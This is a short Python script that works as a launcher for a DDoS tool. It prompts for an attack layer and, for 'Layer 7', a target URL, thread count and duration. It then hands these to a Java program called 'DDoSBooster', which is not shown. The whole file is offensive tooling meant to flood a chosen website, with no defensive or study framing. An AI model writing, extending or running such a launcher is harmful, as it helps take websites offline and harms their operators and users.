import subprocess

def main():
    print("Choose attack layer:")
    print("1. Layer 4 (Under Maintenance)")
    print("2. Layer 7 (HTTP/HTTPS)")

    layer_choice = input("Enter your choice (1 or 2): ")

    if layer_choice == "1":
        print("Layer 4 is under maintenance.")
        return
    elif layer_choice == "2":
        target_url = input("Enter the target URL (e.g., http://example.com): ")
        num_threads = input("Enter number of threads: ")
        duration = input("Enter attack duration in seconds: ")

        print("Starting Layer 7 attack...")
        subprocess.run(["java", "DDoSBooster"], input=f"{target_url}\n{duration}\n{num_threads}\n", text=True)
    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()
      
